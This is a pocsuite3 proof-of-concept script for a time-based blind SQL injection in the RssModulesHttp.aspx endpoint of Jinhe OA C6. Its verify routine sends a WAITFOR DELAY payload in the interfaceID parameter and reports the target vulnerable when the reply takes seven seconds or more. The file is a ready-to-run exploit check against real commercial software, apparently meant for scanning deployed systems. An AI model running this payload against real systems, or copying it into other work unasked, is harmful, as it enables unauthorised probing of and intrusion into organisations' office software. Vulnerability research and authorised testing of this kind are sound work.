# _*_ coding:utf-8 _*_
# @Time : 2024/2/20
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class jinhe_rssmodules_sql(POCBase):
    pocDesc = '''金和OA C6 RssModulesHttp.aspx存在SQL注入漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-20'
    name = "金和OA C6 RssModulesHttp.aspx存在SQL注入漏洞"
    #app="金和网络-金和OA"

    def _verify(self):

        result = {}
        url = self.url+ '/C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=1;WAITFOR+DELAY+%270:0:7%27--'
        headers = {
            "User-Agent": "(Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language':'zh-CN,zh-HK;q=0.9,zh;q=0.8',
            'Connection': 'close'
        }
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and response.elapsed.total_seconds() >= 7:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(jinhe_rssmodules_sql)